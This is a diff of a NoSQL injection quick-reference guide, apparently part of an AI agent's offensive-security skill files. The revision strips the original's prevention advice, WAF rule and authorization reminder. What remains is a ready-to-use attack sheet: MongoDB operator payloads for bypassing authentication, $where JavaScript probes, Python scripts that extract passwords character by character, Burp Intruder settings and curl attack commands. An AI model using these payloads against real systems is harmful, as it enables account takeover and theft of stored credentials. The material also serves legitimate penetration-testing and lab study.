@@ -1,303 +1,175 @@
-# NoSQL Injection Quickstart Guide
+# NoSQL Injection — Quick Start
 
-## What is NoSQL Injection?
+Quick reference. Per-technique scenarios in `scenarios/nosql/`. See `injection-principles.md` for decision tree.
 
-NoSQL injection is a vulnerability that allows attackers to interfere with database queries in NoSQL systems (MongoDB, CouchDB, Redis, etc.). Unlike SQL injection, NoSQL injection exploits JSON-based query languages, JavaScript execution, and query operators.
+## Quick detection
 
-## Attack Types
+```bash
+# Syntax injection probes
+?category=Gifts'           # Single quote → 500 = vuln
+?category=Gifts"           # Double quote
+?category=Gifts'||1||'     # Boolean tautology
 
-### 1. Syntax Injection
-Breaking query syntax by injecting special characters and JavaScript code.
+# Operator injection probes (JSON body)
+{"username":"admin","password":{"$ne":""}}
+{"username":{"$ne":""},"password":{"$ne":""}}
 
-**Example:**
+# URL-encoded form
+username[$ne]=&password[$ne]=
+```
+
+## Top auth-bypass payloads
+
+```json
+{"username":"admin","password":{"$ne":""}}
+{"username":{"$ne":""},"password":{"$ne":""}}
+{"username":{"$regex":"^admin"},"password":{"$ne":""}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$in":["admin","root"]},"password":{"$ne":""}}
+```
+
+## URL-encoded equivalent
+
+```
+username[$ne]=&password[$ne]=
+username[$gt]=&password[$gt]=
+username[$regex]=^admin&password[$ne]=
+```
+
+## $where JavaScript injection
+
 ```javascript
-// Original query
-this.category == 'Gifts'
-
-// Injected
-this.category == 'Gifts' || 1 || ''  // Always true
+{"$where": "1"}                                    # detection
+{"$where": "this.password.length == 8"}            # length probe
+{"$where": "this.password[0]=='a'"}                # char probe
+{"$where": "this.password.match('^a')"}            # regex probe
+{"$where": "Object.keys(this).length"}             # field count
 ```
 
-### 2. Operator Injection
-Injecting NoSQL query operators to manipulate logic.
+## Boolean blind via injection in string context
 
-**Example:**
-```json
-// Normal login
-{"username": "admin", "password": "secret"}
-
-// Injected
-{"username": "admin", "password": {"$ne": ""}}  // Not equal to empty
-```
-
-## Quick Detection Test
-
-**Step 1: Test for Syntax Injection**
-```
-URL Parameter:
-category=Gifts'
-
-Expected: Error or unexpected behavior
-```
-
-**Step 2: Test for Operator Injection**
-```
-JSON Body:
-{"username": "admin", "password": {"$ne": ""}}
-
-Expected: Authentication bypass
-```
-
-## Essential Payloads
-
-### Authentication Bypass
-
-**Method 1: $ne Operator**
-```json
-{
-  "username": "administrator",
-  "password": {"$ne": ""}
-}
-```
-
-**Method 2: $regex Pattern**
-```json
-{
-  "username": {"$regex": "admin"},
-  "password": {"$ne": ""}
-}
-```
-
-**Method 3: Syntax Injection**
-```
-username=admin'--
-username=admin' || '1'=='1
-```
-
-### Data Extraction
-
-**Boolean-Based Blind:**
 ```javascript
-// Check password length
-admin' && this.password.length < 30 || 'a'=='b
-
-// Extract characters
+admin' && this.password.length == 8 || 'a'=='b
 admin' && this.password[0]=='a' || 'a'=='b
-admin' && this.password[1]=='b' || 'a'=='b
+admin' && /^a/.test(this.password) || 'a'=='b
+admin' && this.password.charCodeAt(0)==97 || 'a'=='b
 ```
 
-**$where JavaScript Injection:**
-```json
-{
-  "username": "admin",
-  "password": "invalid",
-  "$where": "this.password.length == 8"
-}
+Trailing `|| 'a'=='b` mandatory — closes the syntax cleanly.
+
+## Common operators
+
+| Operator | Use |
+|---|---|
+| `$ne` | Not equal |
+| `$gt` / `$gte` | Greater than |
+| `$lt` / `$lte` | Less than |
+| `$in` / `$nin` | In / not in array |
+| `$regex` | Pattern match |
+| `$exists` | Field exists |
+| `$where` | JS predicate |
+| `$or` / `$and` / `$not` / `$nor` | Logical |
+
+## Decision tree
+
+```
+JSON body accepted?
+├── Yes → operator injection (scenarios/nosql/mongo-operator-injection.md)
+└── No → URL-encoded? → bracket notation (mongo-type-confusion.md)
+
+String concat into query?
+└── scenarios/nosql/mongo-syntax-injection.md
+
+$where reachable?
+└── scenarios/nosql/mongo-where-jsinjection.md
+
+Aggregation pipeline endpoint?
+└── scenarios/nosql/mongo-aggregation-pipeline.md
+
+SSRF + gopher://?
+└── scenarios/nosql/redis-ssrf-gopher.md
+
+Cassandra on 9042?
+└── scenarios/nosql/cassandra-cql.md
 ```
 
-### Schema Enumeration
+## Character extraction (Python)
 
-**Field Discovery:**
-```json
-{
-  "$where": "Object.keys(this)[0]"
-}
-```
-
-**Field Name Extraction:**
-```json
-{
-  "$where": "Object.keys(this)[1].match('^u')"
-}
-```
-
-## Burp Suite Workflow
-
-### 1. Intercept Request
-- Burp Proxy → Intercept ON
-- Submit form or request
-- Send to Repeater
-
-### 2. Test Injection
-- Modify parameters with test payloads
-- Try both syntax and operator injection
-- Observe response differences
-
-### 3. Automate with Intruder
-- Set attack positions: `admin' && this.password[§0§]=='§a§'`
-- Attack type: Cluster bomb
-- Payload 1: Numbers (0-31) for position
-- Payload 2: Characters (a-z) for testing
-- Grep - Match: Success indicator string
-
-### 4. Extract Data
-- Sort Intruder results by "Length" or "Grep - match"
-- Identify successful character matches
-- Build password/token character by character
-
-## MongoDB Operators
-
-| Operator | Function | Injection Use |
-|----------|----------|---------------|
-| `$ne` | Not equal | Auth bypass |
-| `$gt` | Greater than | Auth bypass |
-| `$regex` | Pattern match | User enumeration |
-| `$where` | JavaScript | Code execution |
-| `$in` | In array | Multiple values |
-| `$exists` | Field exists | Schema discovery |
-
-## Prevention Quick Guide
-
-### For Developers
-
-**1. Use Parameterized Queries**
-```javascript
-// ❌ BAD - String concatenation
-db.users.find({$where: `this.username == '${username}'`});
-
-// ✅ GOOD - Parameterized
-db.users.findOne({username: username, password: password});
-```
-
-**2. Validate Input Types**
-```javascript
-// ✅ GOOD - Type validation
-if (typeof req.body.username !== 'string') {
-  return res.status(400).send('Invalid input');
-}
-```
-
-**3. Sanitize Input**
-```javascript
-// ✅ GOOD - Using mongo-sanitize
-const sanitize = require('mongo-sanitize');
-const username = sanitize(req.body.username);
-```
-
-**4. Disable JavaScript Execution**
-```bash
-# MongoDB configuration
-mongod --noscripting
-```
-
-**5. Use ODM/ORM Frameworks**
-```javascript
-// ✅ GOOD - Mongoose with schema
-const userSchema = new mongoose.Schema({
-  username: String,
-  password: String
-});
-const User = mongoose.model('User', userSchema);
-User.findOne({username: req.body.username});
-```
-
-### For Security Teams
-
-**1. WAF Rules**
-```
-# Block MongoDB operators
-SecRule REQUEST_BODY "@rx \$(?:ne|gt|where|regex)" "deny"
-```
-
-**2. Input Validation**
-- Whitelist allowed characters
-- Reject special characters: `$`, `{`, `}`, `'`, `"`
-- Validate JSON structure
-
-**3. Monitoring**
-```bash
-# Monitor for suspicious patterns
-grep '$where' /var/log/webapp/access.log
-grep 'Object.keys' /var/log/webapp/access.log
-```
-
-## Common Mistakes
-
-### 1. Incomplete String Closure
-```javascript
-❌ Wrong: admin' && this.password[0]=='a'
-// Results in syntax error
-
-✅ Right: admin' && this.password[0]=='a' || 'x'=='y'
-// Properly closed
-```
-
-### 2. Wrong Content-Type
-```http
-❌ Wrong: Content-Type: application/x-www-form-urlencoded
-{"username": "admin"}
-
-✅ Right: Content-Type: application/json
-{"username": "admin"}
-```
-
-### 3. Not URL Encoding
-```
-❌ Wrong: Gifts'||1||'
-✅ Right: Gifts'%7c%7c1%7c%7c'
-```
-
-## Real-World Impact
-
-**Successful NoSQL injection allows:**
-- Complete authentication bypass
-- Unauthorized data access
-- Sensitive data extraction (passwords, tokens)
-- Account takeover
-- Privilege escalation
-- Schema disclosure
-
-## Quick Reference Commands
-
-**Test for Injection:**
-```bash
-# Syntax injection
-curl "http://target.com/filter?category=Gifts'%7c%7c1%7c%7c'"
-
-# Operator injection
-curl -X POST http://target.com/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":{"$ne":""}}'
-```
-
-**Extract Data:**
 ```python
-import requests
-
-# Boolean-based extraction
-for i in range(8):
-    for c in 'abcdefghijklmnopqrstuvwxyz':
-        payload = f"admin' && this.password[{i}]=='{c}' || 'x'=='y'"
-        r = requests.get(f"http://target.com/lookup?user={payload}")
-        if "username" in r.text:
-            print(f"Position {i}: {c}")
-            break
+import requests, string
+def extract_password(url, username, length):
+    pw = ""
+    chars = string.ascii_lowercase + string.digits
+    for pos in range(length):
+        for c in chars:
+            payload = f"{username}' && this.password[{pos}]=='{c}' || 'x'=='y"
+            r = requests.get(url, params={'user': payload})
+            if "Your username is:" in r.text:
+                pw += c
+                break
+    return pw
 ```
 
-## GraphQL Delivery Vector
+## Binary search (charCodeAt)
 
-When NoSQL injection is through a GraphQL API, inject operators into variables:
+```python
+def binary_search_char(url, position):
+    low, high = 32, 126
+    while low <= high:
+        mid = (low + high) // 2
+        payload = f"admin' && this.password.charCodeAt({position})>{mid} || 'x'=='y"
+        if "Your username is:" in requests.get(url, params={'user': payload}).text:
+            low = mid + 1
+        else:
+            high = mid - 1
+    return chr(low)
+```
+
+## Burp Intruder configuration
+
+- Cluster Bomb (position × character).
+- Position 1: numbers 0–32.
+- Position 2: `abcdefghijklmnopqrstuvwxyz0123456789`.
+- Grep Match: `Your username is:` / `Welcome back`.
+- Request: `{"username":"admin","password":"x","$where":"this.password[§0§]=='§a§'"}`
+
+## URL encoding
+
+| Char | Encoded |
+|---|---|
+| `'` | `%27` |
+| `"` | `%22` |
+| `&` | `%26` |
+| `\|` | `%7c` |
+| `[` `]` | `%5b` `%5d` |
+| `{` `}` | `%7b` `%7d` |
+| `$` | `%24` |
+
+## cURL examples
 
 ```bash
-# Replace scalar filter value with MongoDB operator
-curl -X POST TARGET/graphql -H "Content-Type: application/json" \
-  -d '{"query":"query($f:JSON){users(filter:$f){username flag}}","variables":{"f":{"is_admin":{"$ne":false}}}}'
+# JSON body operator
+curl -X POST /login -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":{"$ne":""}}'
+
+# URL-encoded form
+curl -X POST /login -d 'username[$ne]=&password[$ne]='
+
+# $where JS
+curl -X POST /login -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"x","$where":"1"}'
 ```
 
-Key difference: operators go **inside GraphQL variables**, not in HTTP form/JSON body directly.
-**Important**: Enumerate ALL matching records — don't stop at first result. Sensitive data may be on any record.
+## Tools
 
-Full combined playbook: `.claude/skills/api-security/reference/graphql-nosql-combined.md`
+- NoSQLMap (`nosqlmap -u <url> --tor`).
+- Burp Suite Intruder for char-by-char.
+- Custom Python with `requests.post(json=...)`.
+- mongosh / mongo CLI for sandbox testing.
 
----
+## Resources
 
-## Additional Resources
-
-- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
-- **OWASP Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html
-- **HackTricks Guide:** https://book.hacktricks.xyz/pentesting-web/nosql-injection
-
----
-
-**Remember:** Always obtain proper authorization before testing. Unauthorized access is illegal.
-
+- `INDEX.md`, `injection-principles.md`.
+- `scenarios/nosql/` — full scenarios.
+- `nosql-injection-resources.md` — links, CVEs, tools.
+- PortSwigger NoSQL labs.
